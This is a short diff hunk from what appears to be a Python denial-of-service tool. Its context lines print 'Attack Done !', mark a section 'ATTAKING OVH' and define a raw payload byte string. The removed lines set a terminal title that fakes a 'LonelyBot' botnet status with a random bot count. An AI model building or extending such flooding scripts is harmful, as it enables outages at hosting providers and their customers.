@@ -24,8 +24,6 @@ def countdown(t):
             stdout.flush()
             stdout.write("\r "+Fore.MAGENTA+"[*]"+Fore.WHITE+" Attack Done !                                   \n")
             return
-        bots = (random.randint(666,9999))
-		sys.stdout.write("\x1b]2;LonelyBot - Running: [25] - Api Connected: [80] - Expiry: [999.99] - Online User: [1] - Admin: Wizzly - Bots: {}% -\x07".format (bots))
 #------------------------------ATTAKING OVH--
 payload1 = b"\x00\x02\x00\x2f"
 #ua
